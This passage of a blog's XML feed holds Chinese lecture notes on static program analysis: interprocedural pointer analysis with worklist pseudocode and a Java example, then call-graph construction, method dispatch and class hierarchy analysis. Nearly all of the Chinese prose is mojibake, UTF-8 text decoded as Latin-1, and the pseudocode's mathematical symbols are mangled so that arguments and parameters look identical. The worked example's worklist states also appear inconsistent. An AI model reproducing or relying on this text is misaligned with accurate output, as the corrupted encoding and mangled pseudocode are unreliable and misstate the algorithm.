src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200823204227690.png" alt="image-20200823204227690"></p></li><li><p>å¯¹äºå…¶ä»–å‚æ•°ï¼ŒæŒ‡é’ˆåˆ†ææ— æ³•ç¡®å®šå®ƒä»¬çš„å”¯ä¸€å¯¹è±¡å®ä¾‹ï¼Œä¸ºä¿è¯mayåˆ†æï¼Œéœ€è¦ä¼ é€’å…ˆå‰æ‰€æœ‰å¯èƒ½æ€§ï¼Œå³å¯èƒ½æŒ‡å‘çš„é›†åˆã€‚</p></li></ol><p>å½’æ ¹ç»“åº•ï¼Œthiså’Œä¸åŒå‚æ•°è¿˜æ˜¯æœ‰åŒºåˆ«çš„ï¼Œthisçš„å®ä¾‹å‚ä¸äº† Dispatch è¿‡ç¨‹ã€‚</p><h2 id="Interprocedural-pointer-analysis"><a href="#Interprocedural-pointer-analysis" class="headerlink" title="Interprocedural pointer analysis"></a>Interprocedural pointer analysis</h2><ol><li>å’Œå…¶ä»–è¿‡ç¨‹é—´åˆ†æä¸€æ ·ï¼Œè¿‡ç¨‹é—´æŒ‡é’ˆåˆ†æéœ€è¦æŒ‡å®šä¸€ä¸ªå‡½æ•°å…¥å£</li><li>è¿‡ç¨‹é—´æŒ‡é’ˆåˆ†æä¸€è¾¹åš<strong>æŒ‡é’ˆåˆ†æ</strong>ï¼Œä¸€è¾¹æ„é€ <strong>è°ƒç”¨å›¾</strong></li><li>ç”±å…¥å£å‡ºå‘ä¸æ–­æ¢ç´¢æœªçŸ¥å‡½æ•°ï¼Œç›´åˆ°æ‰€æœ‰å¯è¢«æ¢ç´¢çš„å‡½æ•°éƒ½è¢«å¤„ç†å®Œæˆï¼Œè¿™æ ·æ—¢å¯ä»¥æé«˜æ•ˆç‡ï¼Œåˆå¯ä»¥æé«˜ç²¾åº¦</li></ol><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Solve</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    S: ç¨‹åºæ‰€æœ‰è¯­å¥</span></span><br><span class="line"><span class="string">    WL: å·¥ä½œé˜Ÿåˆ—</span></span><br><span class="line"><span class="string">    PFG: Pointer flow graph</span></span><br><span class="line"><span class="string">    S: å¯è¾¾æ‰€æœ‰è¯­å¥é›†åˆ s_mè¡¨ç¤ºå‡½æ•°mçš„æ‰€æœ‰è¯­å¥é›†åˆ</span></span><br><span class="line"><span class="string">    RM: å¯è¾¾æ‰€æœ‰å‡½æ•°é›†åˆ</span></span><br><span class="line"><span class="string">    CG: è°ƒç”¨å›¾ï¼Œä¿å­˜è¾¹</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    WL = [] <span class="comment"># e.g., [&lt;n, pts&gt;] è¡¨ç¤ºæŒ‡é’ˆnå¯èƒ½ä¼šæŒ‡å‘ptsé›†åˆï¼ˆæ¯æ¬¡è¿­ä»£å°±ä¼šæœ‰æ–°çš„å¯èƒ½ï¼‰</span></span><br><span class="line">    PFG = &#123;&#125; <span class="comment"># e.g., &#123;&lt;x, &#123;ğ‘œğ‘–&#125;&gt;&#125; è¡¨ç¤ºæŒ‡é’ˆxæŒ‡å‘å¯¹è±¡ğ‘œğ‘–</span></span><br><span class="line">    S = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">    RM = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">    CG = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">    AddReachable(m) <span class="comment"># difference</span></span><br><span class="line">    <span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        remove n, pts <span class="keyword">from</span> WL</span><br><span class="line">        Î” = pts - pt(n)</span><br><span class="line">        Propagate(n, Î”)</span><br><span class="line">        <span class="keyword">if</span> n represents a variable x:</span><br><span class="line">            <span class="keyword">for</span> each ğ‘œğ‘– âˆˆ Î”:</span><br><span class="line">                <span class="keyword">for</span> each x.f = y âˆˆ S: <span class="comment"># å¤„ç† store stmt</span></span><br><span class="line">                    AddEdge(y, ğ‘œğ‘–.ğ‘“)</span><br><span class="line">                <span class="keyword">for</span> each y = x.f âˆˆ S: <span class="comment"># å¤„ç† load stmt</span></span><br><span class="line">                    AddEdge(ğ‘œğ‘–.ğ‘“, y)</span><br><span class="line">                ProcessCall(x, ğ‘œğ‘–) <span class="comment"># added</span></span><br></pre></td></tr></table></figure><p>ä¸å•å‡½æ•°çš„æŒ‡é’ˆåˆ†æä¸åŒï¼Œä¸»è¦å˜åŒ–åœ¨12ã€13ã€14ã€15å’Œ26è¡Œï¼Œåœ¨å‡½æ•°åˆå§‹åŒ–é˜¶æ®µï¼Œå¢åŠ å¯è¾¾è¯­å¥é›†åˆã€å¯è¾¾å‡½æ•°é›†åˆå’Œè°ƒç”¨å›¾ï¼Œä»¥åŠå¯¹ new å’Œ assign çš„å¤„ç†æ”¾åœ¨äº† <code>AddReachable()</code> å‡½æ•°ä¸­ï¼Œåœ¨å˜åŒ–çš„æ¯ä¸ªå¯¹è±¡å®ä¾‹ä¸­ï¼Œé€šè¿‡ <code>ProcessCall()</code>å¤„ç†call stmtâ€”â€”å½“nä¸ºä¸€ä¸ªå˜é‡æ—¶è°ƒç”¨ã€‚</p><h3 id="AddReachable-m"><a href="#AddReachable-m" class="headerlink" title="AddReachable(m)"></a>AddReachable(m)</h3><p><code>AddReachable(m)</code>å‡½æ•°ç”¨äºå°†æ–°çš„æ–¹æ³• $m$ åŠ å…¥å¯è¾¾é›†åˆä¸­ï¼ŒåŒæ—¶å¤„ç† $m$ ä¸­ new å’Œ assign è¯­å¥ï¼Œå¤„ç†æ–¹æ³•ä¸å•å‡½æ•°ç±»ä¼¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddReachable</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> m âˆ‰ RM:</span><br><span class="line">        <span class="comment"># æ·»åŠ æ–°çš„å·²çŸ¥æ–¹æ³•å’Œè¯­å¥</span></span><br><span class="line">        add m to RM</span><br><span class="line">        S âˆª= S_m</span><br><span class="line">        <span class="comment"># æ›´æ–° worklist å’Œ PFG</span></span><br><span class="line">        <span class="keyword">for</span> each i: x = new T() âˆˆ S_m:</span><br><span class="line">            add &lt;x, &#123;ğ‘œğ‘–&#125;&gt; to WL</span><br><span class="line">        <span class="keyword">for</span> each x = y âˆˆ S_m:</span><br><span class="line">            AddEdge(y, x)</span><br></pre></td></tr></table></figure><h3 id="ProcessCall-x-ğ‘œğ‘–"><a href="#ProcessCall-x-ğ‘œğ‘–" class="headerlink" title="ProcessCall(x, ğ‘œğ‘–)"></a>ProcessCall(x, ğ‘œğ‘–)</h3><p>$ProcessCall(x,o_i)$ ç”¨äºå¤„ç† call è¯­å¥ï¼Œç®—æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ProcessCall</span><span class="params">(x, ğ‘œğ‘–)</span>:</span> </span><br><span class="line">    <span class="keyword">for</span> l: r = x.k(a1,â€¦,an) âˆˆ S:</span><br><span class="line">        <span class="comment"># è·å–æ–¹æ³•m</span></span><br><span class="line">        ğ‘š = Dispatch(ğ‘œğ‘–, k)</span><br><span class="line">        <span class="comment"># pass receiver object to "this"</span></span><br><span class="line">        add &lt;m_this,&#123;ğ‘œğ‘–&#125;&gt; to WL</span><br><span class="line">        <span class="keyword">if</span> l â†’ m âˆ‰ CG:</span><br><span class="line">            <span class="comment"># æ„å»ºcall graph</span></span><br><span class="line">            add l â†’ m to CG</span><br><span class="line">            <span class="comment"># æ ‡è®°æ–°æ–¹æ³•ä¸ºå·²çŸ¥æ–¹æ³•</span></span><br><span class="line">            AddReachable(m)</span><br><span class="line">            <span class="comment"># ä¼ é€’æ¯ä¸ªå‚æ•°ï¼Œå»ºè¾¹</span></span><br><span class="line">            <span class="keyword">for</span> parameter ğ‘ğ‘– of m:</span><br><span class="line">                AddEdge(ğ‘ğ‘–, ğ‘ğ‘–)</span><br><span class="line">            <span class="comment"># ä¼ é€’è¿”å›å€¼</span></span><br><span class="line">            AddEdge(ğ‘š_ğ‘Ÿğ‘’ğ‘¡, r)</span><br></pre></td></tr></table></figure><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>è®¾æœ‰å¦‚ä¸‹å¾…åˆ†æä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        A a = <span class="keyword">new</span> A();</span><br><span class="line">        A b = <span class="keyword">new</span> B();</span><br><span class="line">        A c = b.foo(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">A <span class="title">foo</span><span class="params">(A x)</span> </span>&#123; â€¦ &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function">A <span class="title">foo</span><span class="params">(A y)</span> </span>&#123;</span><br><span class="line">        A r = <span class="keyword">new</span> A();</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é¦–å…ˆç¨‹åºåˆå§‹åŒ–ï¼Œæœ‰å¦‚ä¸‹ç»“æœï¼š</strong></p><ul><li>worklistï¼Œç”±3ã€4è¡Œçš„new stmtï¼š<br>WL=[&lt;a,{o3}&gt;,&lt;b,{o4}&gt;]</li><li>RMï¼Œ<code>A.main()</code>æˆä¸ºå·²çŸ¥å‡½æ•°ï¼š<br>RM={A.main()}</li><li>CG={}</li><li>PFGä¸ºç©ºï¼Œå› ä¸ºæ²¡æœ‰assign</li></ul><p><strong>è¿›å…¥å¾ªç¯ï¼Œå¤„ç† &lt;a,{o3}&gt;ï¼š</strong></p><p><code>a</code>æ²¡æœ‰storeã€loadå’Œcallï¼Œå› æ­¤åªåš<code>propagate(a,{o3})</code></p><ul><li>WL=[&lt;b,{o4}&gt;]</li><li>RM={A.main()}</li><li>CG={}</li><li>PFG:  <pre class="mermaid">    graph RL      a("a{o3}")</pre></li></ul><p><strong>å¤„ç† &lt;b,{o4}&gt;ï¼š</strong></p><ol><li>å…ˆåš<code>propagate(b,{o4})</code>;</li><li>ç”±äºç¬¬5è¡Œå­˜åœ¨è°ƒç”¨ï¼Œæ‰§è¡Œ<code>ProcessCall(b, o4)</code>ï¼Œåœ¨å‡½æ•°ä¸­ï¼Œé¦–å…ˆè§£æåˆ°è°ƒç”¨å‡½æ•°ä¸º<code>m=B.foo(A)</code>ï¼Œå°† &lt;B.foo/this. {o4}&gt; åŠ å…¥ worklist;</li><li>æ¥ç€ç”±äºä¹‹å‰æ²¡æœ‰åˆ†æè¿‡è¯¥å‡½æ•°è°ƒç”¨:<ol><li>å°† <code>5â†’B.foo(A)</code> åŠ å…¥CG</li></ol></li><li>è°ƒç”¨ <code>AddReachable()</code>   <ol><li>å°†<code>B.foo(A)</code>åŠ å…¥åˆ°å·²çŸ¥å‡½æ•°   </li><li>æ³¨æ„åˆ°11è¡Œå­˜åœ¨newæ“ä½œï¼Œå°†{&lt;r, o11&gt;}åŠ å…¥worklist</li><li>è°ƒç”¨ <code>AddEdge(ai, pi)</code>ï¼Œæ›´æ–°PFG</li><li>è°ƒç”¨<code>AddEdge(r, c)</code>ï¼Œæ›´æ–°PFG</li></ol></li></ol><p>å¤„ç†ç»“æœä¸ºï¼š</p><ul><li>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</li><li>RM={A.main(), B.foo(A)}</li><li>CG={5â†’B.foo(A)}</li><li>PFG:  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{}")      b("b{}")      r("r{}")-->c("c{}")</pre></li></ul><p><strong>å¤„ç†<code>&lt;B.foo/this, {o4}&gt;</code>ï¼š</strong></p><p>åªéœ€è¦åš<code>Propagate(B.foo/this, {o4})</code></p><ul><li>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</li><li>RM={A.main(), B.foo(A)}</li><li>CG={5â†’B.foo(A)}</li><li>PFG:  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{}")      b("b{}")      r("r{}")-->c("c{}")      Bfoo("B.foo/this{o4}")</pre></li></ul><p>åç»­æ­¥éª¤ç±»ä¼¼ï¼Œæœ€åç»“æœä¸ºï¼š</p><ul><li>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</li><li>RM={A.main(), B.foo(A)}</li><li>CG={5â†’B.foo(A)}</li><li>PFG:  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{o3}")      b("b{o4}")      r("r{o11}")-->c("c{o11}")      Bfoo("B.foo/this{o4}")</pre></li></ul><h1 id="ç›¸å…³æ–‡çŒ®"><a href="#ç›¸å…³æ–‡çŒ®" class="headerlink" title="ç›¸å…³æ–‡çŒ®"></a>ç›¸å…³æ–‡çŒ®</h1><ol><li>William E. Weihl, â€œInterprocedural Data Flow Analysis in the Presence of Pointers, Procedure Variables, and Label Variablesâ€. POPL 1980.</li><li>Vini Kanvar, Uday P. Khedker, â€œHeap Abstractions for Static Analysisâ€. ACM CSUR 2016.</li><li>Lars Ole Andersen, 1994. â€œProgram Analysis and Specialization for the C Programming Languageâ€. Ph.D. Thesis. University of Copenhagen.</li><li>Hardekopf B, Lin C. Flow-sensitive pointer analysis for millions of lines of code. CGO 2011:289-298.</li><li>Lecture Notes on Pointer Analysis, <a href="https://www.cs.cmu.edu/~aldrich/courses/15-819O-13sp/resources/pointer.pdf" target="_blank" rel="noopener">https://www.cs.cmu.edu/~aldrich/courses/15-819O-13sp/resources/pointer.pdf</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Motivation&quot;&gt;&lt;a href=&quot;#Motivation&quot; class=&quot;headerlink&quot; title=&quot;Motivation&quot;&gt;&lt;/a&gt;Motivation&lt;/h1&gt;&lt;p&gt;CHA åªçœ‹å®šä¹‰ç±»å‹ï¼Œä¼šå¾—åˆ°å¾ˆå¤šå®é™…ä¸è¢«è°ƒç”¨çš„å­ç±»æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒCHAçš„å¸¸é‡åˆ†ææ—¶åªèƒ½å¾—åˆ°NAC&lt;/p&gt;&lt;p&gt;è€ŒæŒ‡é’ˆåˆ†æä¼šå¾—åˆ°æ›´ç²¾ç¡®çš„å¯¹è±¡ç±»å‹ï¼š&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200818213708639.png&quot; alt=&quot;image-20200818213708639&quot;&gt;&lt;/p&gt;&lt;h1 id=&quot;Introduction-to-Pointer-Analysis&quot;&gt;&lt;a href=&quot;#Introduction-to-Pointer-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Introduction to Pointer Analysis&quot;&gt;&lt;/a&gt;Introduction to Pointer Analysis&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;A fundamental static analysis, computes which memory locations a pointer can point to.&lt;/p&gt;
&lt;p&gt;For object-oriented programs, computes which objects a pointer (variable or field) can point to.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="è¿‡ç¨‹é—´åˆ†æ" scheme="http://anemone.top/tags/%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/</id>
    <published>2020-08-17T12:43:13.000Z</published>
    <updated>2020-10-04T03:49:10.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>è¿‡ç¨‹å†…åˆ†æé‡åˆ°å‡½æ•°è°ƒç”¨åªèƒ½åšä¿å®ˆå‡è®¾ï¼Œå¯¼è‡´è¿‡å¤šè¯¯æŠ¥ï¼Œè€Œè¿‡ç¨‹é—´åˆ†æå¯ä»¥è·Ÿè¿›è¢«è°ƒå‡½æ•°ï¼Œå› æ­¤æ›´å‡†ç¡®.</p><h1 id="Call-Graph-Construction"><a href="#Call-Graph-Construction" class="headerlink" title="Call Graph Construction"></a>Call Graph Construction</h1><blockquote><p> A call graph is a set of call edges from  call-sites to their target methods (callees)</p></blockquote><a id="more"></a><p>Call Graphï¼Œç¨‹åºä¸­è°ƒç”¨è¾¹çš„é›†åˆï¼Œè°ƒç”¨è¾¹ä»è°ƒç”¨ç‚¹ï¼ˆcall-siteï¼‰å‡ºå‘åˆ°è¢«è°ƒå‡½æ•°ï¼ˆcalleeï¼‰ï¼Œè¡¨ç¤ºç¨‹åºçš„è°ƒç”¨å…³ç³».</p><p>ç¡®å®šå‡½æ•°è°ƒç”¨ç›®æ ‡ï¼ˆæ„é€ è°ƒç”¨å›¾ï¼‰çš„åˆ†æç§°ä¸º<strong>æ§åˆ¶æµåˆ†æ</strong>ã€‚</p><h2 id="è°ƒç”¨å›¾æ„å»ºç®—æ³•"><a href="#è°ƒç”¨å›¾æ„å»ºç®—æ³•" class="headerlink" title="è°ƒç”¨å›¾æ„å»ºç®—æ³•"></a>è°ƒç”¨å›¾æ„å»ºç®—æ³•</h2><p>è°ƒç”¨å›¾æ„å»ºç®—æ³•ä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼š</p><ol><li>Class hierarchy analysisï¼ˆCHAï¼‰</li><li>Rapid type analysisï¼ˆRTAï¼‰</li><li>Variable type analysisï¼ˆVTAï¼‰</li><li>Pointer analysisï¼ˆk-CFAï¼‰</li></ol><p>ç”±ä¸Šè‡³ä¸‹åˆ†æè¶Šæ¥è¶Šç²¾ç¡®ï¼Œä½†åˆ†ææˆæœ¬ä¹Ÿè¶Šæ¥è¶Šå¤§</p><h2 id="Javaè°ƒç”¨æŒ‡ä»¤"><a href="#Javaè°ƒç”¨æŒ‡ä»¤" class="headerlink" title="Javaè°ƒç”¨æŒ‡ä»¤"></a>Javaè°ƒç”¨æŒ‡ä»¤</h2><div class="table-container"><table><thead><tr><th></th><th>é™æ€è°ƒç”¨</th><th>ç‰¹æ®Šè°ƒç”¨</th><th>è™šè°ƒç”¨</th></tr></thead><tbody><tr><td>æŒ‡ä»¤</td><td>invokestatic</td><td>invokespecial</td><td>invokeinterface, invokevirtual</td></tr><tr><td>æ˜¯å¦æ¥å—å¯¹è±¡å®ä¾‹</td><td>N</td><td>Y</td><td>Y</td></tr><tr><td>è¢«è°ƒæ–¹æ³•</td><td>é™æ€æ–¹æ³•</td><td>æ„é€ å‡½æ•°ã€ç§æœ‰å®ä¾‹å‡½æ•°ã€çˆ¶ç±»å®ä¾‹å‡½æ•°</td><td>å…¶ä»–å®ä¾‹æ–¹æ³•</td></tr><tr><td>ç›®æ ‡æ–¹æ³•ä¸ªæ•°</td><td>1</td><td>1</td><td>â‰¥1ï¼ˆå¤šæ€ï¼‰</td></tr><tr><td>ç»‘å®šæ—¶é—´</td><td>ç¼–è¯‘æ—¶</td><td>ç¼–è¯‘æ—¶</td><td>è¿è¡Œæ—¶</td></tr></tbody></table></div><p>å¯ä»¥çœ‹åˆ°ï¼Œå¤„ç†è™šè°ƒç”¨æ˜¯æ„é€ è°ƒç”¨å›¾çš„å…³é”®ã€‚</p><h2 id="Method-Dispatch"><a href="#Method-Dispatch" class="headerlink" title="Method Dispatch"></a>Method Dispatch</h2><p>åœ¨è¿è¡Œæ—¶ï¼Œvirtualcallè°ƒç”¨ï¼ˆ$o^1.foo(\dots)^2$ï¼‰çš„å‡½æ•°ä¸»è¦åŸºäºä¸¤ç‚¹ï¼š</p><ol><li>è°ƒç”¨è€…å®ä¾‹å¯¹è±¡ç±»å‹($o^1$ æŒ‡é’ˆ)ï¼Œè®°ä¸º $c$</li><li>è°ƒç”¨ç‚¹çš„å‡½æ•°ç­¾åï¼Œè®°ä¸º$m$</li></ol><p><strong>å‡½æ•°ç­¾åï¼š</strong>åŒ…æ‹¬ç±»åã€æ–¹æ³•åã€ä»¥åŠæ–¹æ³•æè¿°ç¬¦ï¼ˆdescriptorï¼‰ï¼Œä¸‹å›¾ä¸ºç¤ºä¾‹ï¼Œå‡½æ•°ç­¾åè¡¨ç¤ºä¸º<code>C.foo(P, Q, R)</code><br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200817210616520.png" alt="image-20200817210616520"></p><p>å¯ä»¥çœ‹åˆ°æ–¹æ³•æè¿°ç¬¦åŒ…æ‹¬äº†å‡½æ•°çš„è¿”å›å€¼ç±»å‹å’Œå‚æ•°ç±»å‹ã€‚</p><p>å®šä¹‰å‡½æ•° $\mathrm{Dispatch}(c,m)$ï¼Œè¯¥å‡½æ•°æ¨¡æ‹Ÿè¿è¡Œæ—¶ç©¶ç«Ÿè°ƒç”¨å“ªä¸ªå‡½æ•°</p><script type="math/tex; mode=display">Dispatch(c, m)=\left\{\begin{array}{ll}m' ,& \text{if } c \text{ contains non-abstract method }m' \\& \text{that has the same name and descriptor as }m\\  Dispatch(c', m), & \text{otherwise}\end{array}\right.\\\text{where }c'\text{ is superclass of }c</script><p>å³å½“virtualinvokeæ—¶ï¼Œå¦‚æœå½“å‰ç±» $c$ ä¸­å­˜åœ¨ä¸€ä¸ªéæŠ½è±¡å‡½æ•° $mâ€™$ ï¼Œè¯¥å‡½æ•°åç§°å’Œæ‘˜è¦ä¸$m$ç›¸åŒï¼Œé‚£ä¹ˆè°ƒç”¨è¯¥å‡½æ•°ï¼›</p><p>å¦åˆ™é€’å½’ï¼Œå¯¹ $c$ çš„<strong>çˆ¶ç±»</strong>è°ƒç”¨ $Dispatch$ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥æ–¹æ³•ã€‚</p><h1 id="CHAï¼ˆClass-Hierarchy-Analysisï¼‰"><a href="#CHAï¼ˆClass-Hierarchy-Analysisï¼‰" class="headerlink" title="CHAï¼ˆClass Hierarchy Analysisï¼‰"></a>CHAï¼ˆClass Hierarchy Analysisï¼‰</h1><p>å½“è°ƒç”¨å‘ç”Ÿæ—¶ï¼Œè§£æè°ƒç”¨ç±»å®šä¹‰ï¼Œæ ¹æ®å®šä¹‰ç±»æšä¸¾å…¶<strong>æ‰€æœ‰å­ç±»</strong>ï¼Œæ‰€æœ‰å­ç±»ç¬¦åˆè¦æ±‚çš„å‡½æ•°éƒ½æ˜¯å¯èƒ½ä¼šè¢«è°ƒç”¨çš„å‡½æ•°ã€‚</p><p>é€šè¿‡æ£€æŸ¥Açš„æ‰€æœ‰å­ç±»ï¼Œå¯»æ‰¾è¢«è°ƒç”¨å‡½æ•°</p><p>å…·ä½“ç®—æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Resolve</span><span class="params">(cs)</span>:</span> <span class="comment"># csä¸ºcall site</span></span><br><span class="line">T = &#123;&#125; <span class="comment"># ç®—æ³•æœ€ç»ˆè¾“å‡ºcsæ‰€æœ‰å¯èƒ½è°ƒç”¨çš„å‡½æ•°é›†åˆ</span></span><br><span class="line">    m = method signature at cs</span><br><span class="line">    <span class="comment"># è‹¥ cs æ˜¯ staticcallï¼Œç›´æ¥å°†è¯¥å‡½æ•°åŠ å…¥é›†åˆ</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> a static call:</span><br><span class="line">    T = &#123; m &#125; </span><br><span class="line">    <span class="comment"># è‹¥ cs æ˜¯ specialcallï¼Œè¦å¤„ç†ä¸‰ç§æ–¹æ³•ï¼Œå–æ–¹æ³•mçš„ç±»cmï¼Œå¹¶è°ƒç”¨Dispatch()å¾—åˆ°æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> special call:</span><br><span class="line">        cm = <span class="class"><span class="keyword">class</span> <span class="title">type</span> <span class="title">of</span> <span class="title">m</span></span></span><br><span class="line">        T = &#123; Dispatch(cm, m) &#125;</span><br><span class="line">    <span class="comment"># è‹¥ cs æ˜¯virtualcallï¼Œé¦–å…ˆè·å–åŒ…æ‹¬csè‡ªèº«ç±»åœ¨å†…çš„æ‰€æœ‰å­ç±»ï¼Œåœ¨å°†å…¶dispatch()ç»“æœåŠ å…¥é›†åˆTä¸­</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> a virtual call:</span><br><span class="line">        c = declared type of receiver variable at cs </span><br><span class="line">        <span class="keyword">for</span> each sub_c that <span class="keyword">is</span> a subclass of c <span class="keyword">or</span> C itself:</span><br><span class="line">            add Dispatch(sub_c, m) to T</span><br><span class="line">    <span class="keyword">return</span> T</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾ä¸ºå®é™…ç¤ºä¾‹ï¼Œæ³¨æ„ï¼ŒCHAåªè€ƒè™‘å£°æ˜ç±»å‹ï¼Œä¸è§£æå®ä¾‹ï¼Œå› æ­¤åœ¨åé¢Bå³ä½¿å®ä¾‹åŒ–ä¸ºnew B()ï¼Œä½†æ˜¯è§£æä»ç„¶æœ‰3ç§ï¼Œè¿™ä¹Ÿçœ‹å‡ºäº†CHAçš„ç¼ºé™·ã€‚<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200817213356449.png" alt="image-20200817213356449"></p><h2 id="CHAç‰¹å¾"><a href="#CHAç‰¹å¾" class="headerlink" title="CHAç‰¹å¾"></a>CHAç‰¹å¾</h2><ul><li>å¿«<ul><li>åªè€ƒè™‘å£°æ˜</li><li>å¿½ç•¥æ•°æ®æµå’Œæ§åˆ¶æµ</li></ul></li><li>ä¸å‡†<ul><li>å¯¼è‡´å‡ç›®æ ‡æ–¹æ³•</li></ul></li><li>IDEå¸¸ç”¨çš„æ–¹æ³•ï¼ˆæ¯”å¦‚è¯´ IDEAï¼‰</li></ul><h2 id="ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG"><a 